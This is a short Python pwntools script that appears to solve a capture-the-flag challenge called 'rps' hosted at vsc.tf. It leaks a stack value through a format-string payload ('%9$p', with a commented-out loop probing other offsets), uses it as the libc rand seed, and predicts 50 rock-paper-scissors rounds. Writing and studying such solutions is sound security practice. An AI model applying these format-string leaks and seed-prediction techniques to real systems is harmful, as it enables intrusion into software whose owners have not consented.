#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import ctypes
from pwn import *

elf = context.binary = ELF("./rps", checksec=False)
libc = ctypes.CDLL(elf.libc.path)


def start(argv=[], *a, **kw):
    nc = "nc vsc.tf 3094"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}

# context.log_level = "CRITICAL"
# for i in range(1, 0x20):
#     io = start()
#     payload = f"%{i}$p\n".encode()
#     io.sendlineafter(b"name: ", payload)
#     io.recvuntil(b"Hi ")
#     leak = io.recvline(keepends=False)
#     print(i, leak)
#     io.close()
# context.log_level = "INFO"

io = start()
payload = f"%9$p".encode()
io.sendlineafter(b"name: ", payload)
io.recvuntil(b"Hi ")

seed = int(io.recvline(keepends=False), 16) & 0xffffffff
log.info(f"{seed=:#x}")
libc.srand(seed)

with log.progress("round") as prog:
    for i in range(50):
        prog.status(i + 1)
        hand = "rps"[(libc.rand() + 1) % 3]
        io.sendlineafter(b"(r/p/s)", hand.encode())

io.interactive()
